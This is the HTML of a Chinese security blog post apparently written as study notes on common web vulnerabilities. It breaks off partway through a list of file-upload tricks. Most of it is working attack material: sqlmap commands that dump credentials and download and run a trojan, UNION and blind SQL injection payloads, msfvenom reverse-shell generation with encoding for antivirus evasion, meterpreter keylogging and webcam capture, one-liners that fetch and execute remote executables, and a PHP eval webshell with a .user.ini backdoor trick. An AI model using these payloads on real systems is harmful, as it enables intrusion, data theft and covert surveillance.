@@ -1,0 +1,1370 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="XIAODI22" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/">
+
+
+
+  <title>
+XD22 Web 通用漏洞 - 信息安全 |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">XD22 Web 通用漏洞
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-07-04 00:00:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-04T00:00:00+08:00">2023-07-04</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>20k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>33 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/OpkYA94CeUZvRI5.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/kaZNxKDQWGfuhze.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KopmzJq4geNSalr.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/69RMbK3Oref4Vqo.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/TqxWdE9iAvtYN3n.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/RxL7bMZt5rslE68.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="sql-注入"><a class="markdownIt-Anchor" href="#sql-注入">#</a> sql 注入</h3>
+<h4 id="sqlmap-测试"><a class="markdownIt-Anchor" href="#sqlmap-测试">#</a> sqlmap 测试</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlmap 测试是否存在sql注入：</span></span><br><span class="line">sqlmap -r sqlmap.txt --batch --dbs</span><br><span class="line">sqlmap -r sqlmap.txt --batch -D Machine --tables</span><br><span class="line">sqlmap -r sqlmap.txt --batch -D Machine -T login --columns</span><br><span class="line">sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump</span><br><span class="line">sqlmap -r sqlmap.txt --sql-shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是否高权限用户</span></span><br><span class="line">sqlmap -r sqlmap.txt --batch --is-dba </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除缓存</span></span><br><span class="line">sqlmap -u (http://127.0.0.1/q.php?id=1 --purge </span><br><span class="line">sqlmap -r sqlmap.txt --file-read &#x27;/var/lib/www/1.php&#x27;</span><br><span class="line">sqlmap -r sqlmap.txt --file-write &#x27;d:/w.txt&#x27; --file-dest &#x27;d:/h.txt&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编码注入</span></span><br><span class="line">sqlmap -r sqlmap.txt --batch --tamper=base64encode.py </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlmap通过注入点下载木马并执行：</span></span><br><span class="line">sqlmap -r sqlmap.txt --os-cmd=&quot;certutil.exe - urlcache - split - f [http://127.0.0.1:81/t.exe](http://127.0.0.1:81/t.exe) d:/e.exe&quot;</span><br><span class="line">sqlmap -r sqlmap.txt --os-cmd=&quot;d:/e.exe&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">弹出系统命令对话框但是执行速度会非常慢</span></span><br><span class="line">sqlmap -r sqlmap.txt --os-shell </span><br></pre></td></tr></table></figure>
+<p>++ 数据包中如果某参数后有’*' 号表示从此注入，否则全部尝试注入，可以放在 X-Forawad-for 后等</p>
+<h4 id="手工-sql-注入"><a class="markdownIt-Anchor" href="#手工-sql-注入">#</a> 手工 sql 注入</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对 history.php 所在的 url 地址尝试手工判断是否是注入点</span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20and%201=1--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">猜字段有多少个， 1 时是正确的， 1 、 2 时报错了，说明只能爆出来一个字段</span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%201--+</span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%201,2--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爆出数据库的名字，当前数据库名显示为数据库名是 <span class="built_in">users</span></span></span><br><span class="line">http://192.168.31.208/history.php?user=admin\&#x27; union select database()--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示有四个数据库 information_schema,mysql,performance_schema,sys,<span class="built_in">users</span></span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(schema_name)%20from%20information_schema.schemata--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示数据库 <span class="built_in">users</span> 下有两个表: details,<span class="built_in">log</span></span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27users%27--+group_concat(table_name) from information_schema.tables where table_schema=&#x27;users&#x27;--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示数据库<span class="built_in">users</span>中表detail 有两列:name，password</span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27details%27--+group_concat(column_name) from information_schema.columns where table_name=&#x27;details&#x27;--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示users.detail 中 name 分别是:admin,admin123,john,<span class="built_in">test</span></span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(name)%20from%20users.details--+group_concat(name) from users.details--+</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到 users.detail 中 password 的值:</span></span><br><span class="line">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(password)%20from%20users.details--+group_concat(password) from users.details--+</span><br></pre></td></tr></table></figure>
+<h4 id="msf-生成木马说明"><a class="markdownIt-Anchor" href="#msf-生成木马说明">#</a> msf 生成木马说明</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf生成木马：</span></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= 192 .168.31.18 LPORT= 4444 -b &quot;\x00&quot; -i 10 -f exe -o ~/Desktop/test.exe</span><br><span class="line"></span><br><span class="line">-a x86 使用x86框架</span><br><span class="line">--platform windows 运行平台为windows</span><br><span class="line">-p windows/meterpreter/reverse_tcp 指定payload</span><br><span class="line">LHOST= 192 .168.200.130 LPORT= 8088 本地IP和监听端口</span><br><span class="line">-b &quot;\x00&quot; 去掉坏字符</span><br><span class="line">-i 10 编码 10 次，提高免杀概率</span><br><span class="line">-f exe 木马文件格式</span><br><span class="line">-o /var/www/html/test.exe 输出路径</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听端口等待木马执行：</span></span><br><span class="line">msfconsole</span><br><span class="line">use payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.31.123</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msf控制后的可执行命令</span></span><br><span class="line">getuid 查看当前权限</span><br><span class="line">getsystem 尝试获取system权限</span><br><span class="line">shell 获取当前权限shell会话</span><br><span class="line">ps 列出正在运行的进程</span><br><span class="line">pkill 按名称终止进程</span><br><span class="line">kill 按PID终止进程</span><br><span class="line">reboot 重启 shutdown 关机</span><br><span class="line">upload 上传文件(格式参考:upload /root/1.txt - &gt; d:/)</span><br><span class="line">download 下载文件(格式参考:download c:/1.txt - &gt; /root/)</span><br><span class="line">keyboard_send 令对方键盘输入(参考格式:keyboard_send ilovecc)</span><br><span class="line">keyscan_start 开始捕获击键（开始键盘记录）</span><br><span class="line">keyscan_dump 转储按键缓冲（下载键盘记录）</span><br><span class="line">keyscan_stop 停止捕获击键（停止键盘记录）</span><br><span class="line">record_mic 麦克风录制(格式参考:record_mic -d 13)</span><br><span class="line">screenshot 截图截取对方目前桌面的截图</span><br><span class="line">webcam_snap 摄像头拍摄一张照片</span><br></pre></td></tr></table></figure>
+<h4 id="一句话下载文件命令"><a class="markdownIt-Anchor" href="#一句话下载文件命令">#</a> 一句话下载文件命令</h4>
+<p>参考链接： <span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhwP2Rvd25sb2Fk">https://forum.ywhack.com/bountytips.php?download</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PowerShell - IWR/IEX</span></span><br><span class="line">powershell.exe -Command &quot;Invoke-WebRequest -Uri http://127.0.0.1:81/exp.exe -OutFile test.exe&quot;</span><br><span class="line">powershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadFile(&#x27;http://127.0.0.1:81/exp.exe&#x27;, test.exe)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CMD - Certutil/SMB</span></span><br><span class="line">CMD - Certutil: certutil.exe -urlcache -split - f http://127.0.0.1:81/exp.exe test.exe</span><br><span class="line">CMD - SMB: copy \\127.0.0.1\files\exp.exe test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux - wget</span></span><br><span class="line">wget http://127.0.0.1:81/exp.exe -O test.exe 8. Linux - curl: curl http://127.0.0.1:81/exp.exe -o test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Bitsadmin/msiexec:</span></span><br><span class="line">bitsadmin /rawreturn /transfer down &quot;http://127.0.0.1:81/exp.exe&quot; c:\\test.exe</span><br><span class="line">msiexec /q /i http://127.0.0.1:81/exp.exe</span><br><span class="line">msiexec /q /%os:~1,1%http://127.0.0.1:81/exp.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python Download:</span> </span><br><span class="line">python -c &quot;import urllib2; exec urllib2.urlopen(&#x27;http://127.0.0.1:81/exp.exe&#x27;).read();&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="sql-三大盲注"><a class="markdownIt-Anchor" href="#sql-三大盲注">#</a> sql 三大盲注</h4>
+<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">布尔盲注：有数据库输出判断标准</span></span><br><span class="line">left(database(),1)&gt;&#x27;s&#x27;</span><br><span class="line">select user() regexp&#x27;^r&#x27;</span><br><span class="line">select user() like&#x27;^ro%&#x27;</span><br><span class="line">ascii(substr((select database()),1,1))&lt;&gt;</span><br><span class="line">ord(mid((select user()),1,1))=</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">报错注入：有数据库报错处理判断标准</span></span><br><span class="line">floor(rand(0)*2))</span><br><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">时间盲注：都不需要，比较好用</span></span><br><span class="line">if(left(user(),1)=&#x27;a&#x27;,0,sleep(3));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>盲注中的相关函数的解释</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27; #判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^xiaodi[a-z]&#x27; #匹配xiaodi及xiaodi...等</span><br><span class="line">if (条件,5,0) #条件成立 返回 5 反之 返回 0</span><br><span class="line">sleep(5) #SQL语句延时执行 5 秒</span><br><span class="line">mid(a,b,c) #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c) #从位置b开始，截取字符串a的c长度</span><br><span class="line">left(database(),1)，database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8 #判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97 #判断x的ascii码是否等于 97</span><br></pre></td></tr></table></figure>
+<ul>
+<li>盲注漏洞寻找：特定函数 + 功能点<br>
+ insert/update/delete 无回显，手工测功能点（会员中心 / 删除新闻 / 修改文章 / 留言），注意闭合前面和后面的部分，构造 payload，找到注入点配合工具脚本。代码会带入到数据库中执行，仅保证数据能够执行但没有回显，需要用盲注的方式爆出数据库数据。</li>
+</ul>
+<h4 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入">#</a> 宽字节注入</h4>
+<p>自动加上一个转义符号，会导致注入语句失效，使用宽字节绕过。</p>
+<p>在计算机中每一个字符为 8 位，那么就是 1 个字节，宽字节注入就是两个字节合并从而进行绕过，如 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS93aGVyZS5waHA/aWQ9MQ==">http://127.0.0.1/where.php?id=1</span>’ 当我们输入单引号的时候，那么会被转义成’，这样就无法进行注入。</p>
+<p>但是进行绕过的话，在 id 参数加入一个 % df 被转义后成为 % df%5c 那么就会成为一个繁体字。<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS93aGVyZS5waHA/aWQ9JWRm">http://127.0.0.1/where.php?id=�</span>’ (運’) 这样会被转义，但是这是宽字节，所以即使被转义后也可以进行注入。之后就用 sqlmap 跑即可。</p>
+<h4 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入">#</a> 堆叠注入</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将一堆sql语句叠加后执行，用分号结束上一个语句再叠加其他语句一起执行。在数据库中可以用拼接的语句来实现效果：</span></span><br><span class="line">select * from users where id=1;create table test like users;</span><br><span class="line">select * from users where id=1;drop table test;</span><br><span class="line">select * from users where id=1;select 1,2,3;</span><br><span class="line">select * from users where id=1;insert into users(id,username,password) values (&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果selcet/insert/update/delete被过滤，可以采用编码的方式绕过：</span></span><br><span class="line">PREPARE yuchuli from &#x27;select * from `1919810931114514`&#x27;; EXECUTE yuchuli;</span><br><span class="line">&#x27;;SET @sql = concat(char(115,101,108,101,99,116), &quot; * from `1919810931114514`&quot;); PREPARE yuchuli from @sql; EXECUTE yuchuli;</span><br><span class="line">&#x27;;SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE execsql from @a;EXECUTE execsql;</span><br></pre></td></tr></table></figure>
+<h4 id="二次注入"><a class="markdownIt-Anchor" href="#二次注入">#</a> 二次注入</h4>
+<p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
+<p><strong>可以在注册处注册一个恶意数据</strong></p>
+<p><strong>注册一个 admin’# 的账号，登陆该账号后可以进行密码修改。当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反 斜杠。用 admin’# 登陆，并进行密码修改，密码修改为 123456。</strong></p>
+<p><strong>此时原来 admin 的密码被改变为 123456。因为我们将问题数据存储到了数据库，而程序再取数据库中的数据时没有进行二次判断便直接带入到代码中，从而造成了二次注 入。</strong></p>
+<h4 id="dnslog注入"><a class="markdownIt-Anchor" href="#dnslog注入">#</a> dnslog 注入</h4>
+<p>域名可以分为 5 级，从右向左解析，用’.' 分割级别，低级别的域名要在高级别的域名中去解析，所以当 <span class="exturl" data-url="aHR0cDovL3NlY3VyaXR5LmdpdHc3Yy5kbnNsb2cuY24=">security.gitw7c.dnslog.cn</span> 去 <span class="exturl" data-url="aHR0cDovL2dpdHc3Yy5kbnNsb2cuY24=">gitw7c.dnslog.cn</span> 中去解 析的时候，就会留下解析记录，通过获取前来解析的低级域名前缀来获取我们需要的信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dnslog 注入使用</span></span><br><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.gitw7c.dnslog.cn/abc&#x27;));</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">//转换之后的结果为:\\security.gitw7c.dnslog.cn</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">load_file请求security.gitw7c.dnslog.cn下的/abc文件时留下dns解析记录来获取信息的。</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>域名解析规则与 mysql 解析 url 的问题</li>
+</ul>
+<p>域名里有一个规则，只能出现数字，字母，下划线；所以在获取到的信息中包含了其<br>
+他特殊符号时，load_file 就会认为是一个错误的域名，就不会去从网络中解析了。当数据 库名为 security，以字母开头，在域名规则内是允许的，load_file 会向域名进行解析。而当 在域名中拼接一个 @符号时，就不会进行解析。</p>
+<p>在使用 group_concat 合并查询时，会自动使用’,‘连接我们查询到的每值，但是由于’,’ 在 url 中是不允许出现的，所以使用 group 查询到的值去解析时候，mysql 就会认为这不是一 个 url 地址，就不会出现解析的操作，所以就没法获取到值。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用replace，substr等函数，可以绕过url解析的问题。如：</span></span><br><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select SUBSTR(replace((group_concat(username )),&#x27;,&#x27;,&#x27;_&#x27;),1,63) from users),&#x27;.qnpqsu.dnslog.cn/abc&#x27;))</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过正则替换将replace中的<span class="string">&quot;,&quot;</span>全部替换为<span class="string">&quot;_&quot;</span>后符合了url的解析规则，并且需要将查询结果的字符长度控制在 63 个之内。</span></span><br></pre></td></tr></table></figure>
+<p><strong>dnslog 还可以解决命令注入无回显的问题，在有命令执行的地方尝试执行命令：curl 得到的 dnslog 子域名，如果执行成功则在 dnslog.cn 上会有回显。dns 协议一般不会被禁用或被防火墙拦截，是可以出网的。</strong></p>
+<h3 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传">#</a> 文件上传</h3>
+<h4 id="常见绕过方法"><a class="markdownIt-Anchor" href="#常见绕过方法">#</a> 常见绕过方法</h4>
+<ul>
+<li>前端 js 认证：可修改数据包将 jpg/png 改为 php</li>
+<li>MIME 绕过：抓包修改 content-type 为图片类型 image/jpeg、image/png、image/gif</li>
+<li>点 + 空格 + 点 / 大小写 / 空格绕过：伪造为’1.php. .' 或’1.pHP’或’1.php ’</li>
+<li>文件头部信息绕过：不同格式后缀的图片用编辑器打开之后头几个字母不同，通过伪造</li>
+<li>文件的头部信息绕过文件类型校验，如 gif 的头部是 GIF89A</li>
+<li>.htaccess 绕过：apache 中间件可上传内容为 AddType application/x-httpd-php .png</li>
+<li>的.htaccess 文件，使 png 后缀文件当成 php 解析，nginx 中间件需要相关配置才会支持</li>
+<li>二次渲染绕过：在未被删掉代码的图片源代码中添加后门上传，如果对方服务器返回了</li>
+<li>文件的地址如 http://127.0.0.1/images/?image=1.png 的文件包含形式，则可能执行后门</li>
+<li>二次渲染：图片上传之后被做了修改，遗留下了被裁剪后的图片，图片源代码有所减少</li>
+<li>二次渲染配合条件竞争：文件到了服务器才进行的过滤是存在二次渲染问题的，配合条件竞争可以实现后门写入，文件存在的那一刹那，对文件进行重复访问，此时文件不会被重命名，php 文件留下来了；二次渲染一般用脚本生成图片，手工生成不容易判断哪里的代码会被消除</li>
+<li>图片中的后门代码被执行需要配合解析漏洞、文件包含、.user.ini 或.htaccess 四者之一</li>
+</ul>
+<h4 id="userini-巧用"><a class="markdownIt-Anchor" href="#userini-巧用">#</a> .user.ini 巧用</h4>
+<ul>
+<li>
+<p>.user.ini 绕过：上传内容为 auto_prepend_file=test.png 的.user.ini 文件；并上传内容为 <?php eval($_POST[x]);?>的 test.png，访问 index.php 时则执行 test.png 中的后门</p>
+</li>
+<li>
+<p>点过滤绕过：上传内容为 &lt;?=include’<span class="exturl" data-url="aHR0cDovLzc5NDc1MDA2OS8=">http://794750069/</span>’&gt; 的 xxx 文件，此地址的首页源 代码上写上后门代码，并上传 auto_prepend_file=xxx 的.user.ini 文件，则可触发后门</p>
+</li>
+<li>
+<p>文件上传即删除绕过：上传内容为 auto_prepend_file=http://794750069 / 的.user.ini 文 件，此时访问 index.php 就会被当作访问了存放在远程的后门文件</p>
+</li>
+<li>
